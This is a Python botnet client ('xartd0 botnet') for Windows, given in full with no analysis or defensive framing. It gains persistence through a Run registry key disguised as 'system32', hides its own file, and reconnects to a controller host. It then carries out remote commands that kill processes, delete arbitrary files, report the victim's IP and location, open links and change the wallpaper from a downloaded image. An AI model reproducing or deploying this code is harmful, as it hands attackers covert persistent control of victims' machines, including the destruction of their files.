from imports import *



help_message = '''  ├ Help
  └ open-link (link)
    └ invisible (make the file hidden)
      └ error (message) (send an error message)
        └ exit (close client)
          └ help (help menu)
            └ ip-info (information about client ip)
              └ pids (list of client proccesses)
                └ kill (PID) (kill proccess by PID)
                  └ set-wallpaper (url) (change client wallpaper)
                    └ remove-file (path) (remove file from system)
            '''

def AddToRegistry():
    pth = os.path.dirname(os.path.realpath(__file__))
    s_name=os.path.split(sys.argv[0])[1]    
    address=os.path.join(pth,s_name)
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open,"system32",0,reg.REG_SZ,address)
    reg.CloseKey(open)

def set_wallpaper(url):
    print(url)
    r = requests.get(url=url)
    name = "background_image.png"
    file = open(name, "wb")
    file.write(r.content)
    file.close()
    PATH = os.path.abspath(name)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)


def server_control():
    try:
        while True:
            command = s.recv(1024).decode()
            print(command)
            if 'error' in command:
                s.send('  └─▷ The message was sent successfully'.encode())
                ctypes.windll.user32.MessageBoxW(0, command.partition(' ')[2], "xartd0 botnet", 16)
            elif command == 'exit':
                s.send('  └─▷ Session was successfully closed'.encode())
                s.close()
                exit(0)
            elif command == 'invisible':
                s.send(f'  └─▷ {sys.argv[0]} was successfully hidden'.encode())
                subprocess.check_call(["attrib","+H",sys.argv[0]])
            elif 'open-link' in command:
                s.send(f'  └─▷ {command.split(" ")[1]} has been successfully opened'.encode())
                webbrowser.open(command.split(' ')[1])
            elif command == 'help':
                s.send(help_message
                .encode())
            elif command == 'ip-info':
                response = requests.get(f'http://ip-api.com/json/').json()
                s.send(f'''  ├ Ip: {response["query"]}
    └ Country: {response["country"]}
        └ City: {response["regionName"]}
        └ Zip-code: {response["zip"]}
            └ Isp: {response["isp"]}'''.encode())
            elif command == 'pids':
                proccesses = ''
                for proc in psutil.process_iter():
                    try:
                        proccesses += f"{proc.name()}:{proc.pid}\n"
                    except:
                        pass
                s.send(proccesses.encode())
            elif 'kill' in command:
                print(command.split(' ')[1])
                os.system(f"taskkill /F /PID {command.split(' ')[1]}")
                s.send(f'  └─▷ {command.split(" ")[1]} was successfully killed'.encode())
            elif 'set-wallpaper' in command:
                set_wallpaper(command.split(" ")[1])
                s.send(f'  └─▷ Background image was successfully changed'.encode())
            elif 'remove-file' in command:
                os.remove(command.split(" ")[1])
                s.send(f'  └─▷ {command.split(" ")[1]} was successfully deleted'.encode())
            else:
                s.send(f'  └─▷ Command not found!\n{help_message}'.encode())
            
    except Exception as e:
        print(e)
        s.close()
        setup_bot()


def setup_bot():
    global s
    s = socket.socket()
    AddToRegistry()
    while True:
        try:
            time.sleep(10)
            print('Reconnecting...')
            s.connect((HOST_CLIENT, PORT))
            server_control()
            break
        except Exception as e:
            print(e)
            continue

setup_bot()
